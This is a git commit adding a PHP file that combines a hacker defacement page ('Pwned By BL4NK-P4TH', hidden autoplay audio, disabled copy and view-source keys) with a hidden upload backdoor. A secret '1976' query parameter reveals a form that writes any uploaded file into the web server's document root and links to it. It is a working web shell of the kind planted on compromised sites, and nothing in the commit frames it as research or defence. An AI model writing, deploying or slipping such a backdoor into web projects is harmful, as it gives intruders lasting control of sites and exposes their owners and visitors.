4de524873f76d9dd6b29687f2923604a189ce75a
GodzPH <130264937+GodzPH@users.noreply.github.com>
2024-05-23 09:20:24 +0800

    Add files via upload

---
+++ upup.php
@@ -0,0 +1,31 @@
+<!DOCTYPE html>
+<html> 
+<head>
+    <meta name="keywords" content="Pwned By _BLANK ">
+    <link rel="icon" type="image/png" href=""> 
+    <title>Pwned By _BLANK</title>
+    <meta name="description" content="Pwned By _BLANK "> <link href="https://images.wallpapersden.com/image/download/kazutora-hanemiya-hd-tokyo-revengers_bG5lbmmUmZqaraWkpJRmbmdlrWZlbWU.jpg" rel="stylesheet"> <link href="https://images.wallpapersden.com/image/download/kazutora-hanemiya-hd-tokyo-revengers_bG5lbmmUmZqaraWkpJRmbmdlrWZlbWU.jpg" rel="stylesheet"> <!--<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">--> <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> 
+    <style type="text/css">    body {  padding: 0;   margin: 0;  height: 100vh;  width: 100%;  background-size: cover;   background-position: center;  overflow: hidden;   }   .bg {     position: absolute;     left: 0;    right: 0;     top: 0;     bottom: 0;    background: rgba(96, 90, 82, 0.37);   }   .box {    position: absolute;     left: 50%;    top: 50%;     transform: translate(-50%, -50%);     text-align: center;     width: 80%;     color: #fff;  }   h1 {    transform: rotate(-5deg);     font-size: 50px;    letter-spacing: 2px;    font-family: 'Patrick Hand', cursive;   }   p {     font-size: 20px;    letter-spacing: 2px;    font-family: 'Merienda', cursive;   }   a {     text-decoration: none;  }   a:hover {     text-decoration: none   }   
+</style> 
+    <style>
+    img[alt*="https://images.wallpapersden.com/image/download/kazutora-hanemiya-hd-tokyo-revengers_bG5lbmmUmZqaraWkpJRmbmdlrWZlbWU.jpg"]{display:none}</style> 
+    <script language="javascript"> function onKeyDown() { // current pressed key var pressedKey = String.fromCharCode(event.keyCode).toLowerCase(); if (event.ctrlKey && (pressedKey == "c" || pressedKey == "v" || pressedKey == "u")) { // disable key press porcessing event.returnValue = false; } } // onKeyDown </script> </head> <body onload="randombg()" id="random" onkeydown="onKeyDown()"> <div class="bg"></div> <div class="box"> <h1>
+<font style="font-size: 39pt">Pwned By 
+<font color="#FF0000">BL4NK-P4TH</font></font></h1> <p> &nbsp;</p> <p> 
+<span style="font-weight: 700"><font size="6">"Everything's About To Change !! &quot;</font></span><font size="6"><br>
+</font>
+<br>&nbsp;<font size="2"> 
+</font>&nbsp;&nbsp; <b><font size="2">^_^</font></b><font size="2"> </font> <br>
+&nbsp;Chillin! @ 2022</p> <a href="#" onclick="window.location.reload(true);"> <i style="font-size: 30px; color: #fff; padding: 20px 20px;" class="fa fa-zone-h"></i> <a href="#"><i style="font-size: 30px; color: #fff; padding: 20px 20px;" class="fa fa-twitter"></i></a> <a href="#"><i style="font-size: 30px; color: #fff; padding: 20px 20px;" class="fa fa-telegram"></i></a> <a href=""><i style="font-size: 30px; color: #fff; padding: 20px 20px;" class=""></i></a> <i style="font-size: 30px; color: #fff; padding: 20px 20px;" class=""></i></a> <a href="#"><i> </div> <center> </center> <style> body { background: url("https://images.wallpapersden.com/image/download/kazutora-hanemiya-hd-tokyo-revengers_bG5lbmmUmZqaraWkpJRmbmdlrWZlbWU.jpg") no-repeat fixed; background-size: 100% 100%; background-color: black; color: white; } } </style> <script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"> </script> <iframe width="0%" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://k.top4top.io/m_2184sfg9g1.mp3"></iframe> </body> </html>
+<?php
+ if(isset($_GET['1976'])){ echo "<form method='post' enctype='multipart/form-data'>
+  <input type='file' name='id_file'> <input type='submit' name='u' value='u-'> </form>";
+$root = $_SERVER['DOCUMENT_ROOT']; $files = $_FILES['id_file']['name']; $dest = $root.'/'.$files;
+if(isset($_POST['u'])) {
+if(is_writable($root)) {
+if(@copy($_FILES['id_file']['tmp_name'], $dest)) {
+$web = "http://".$_SERVER['HTTP_HOST']."/";
+echo "s u -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
+} else { echo "g u d d r."; } } else {
+if(@copy($_FILES['id_file']['tmp_name'], $files)) { echo "s <b>$files</b> d"; } else { echo "g"; } } } }
+?>
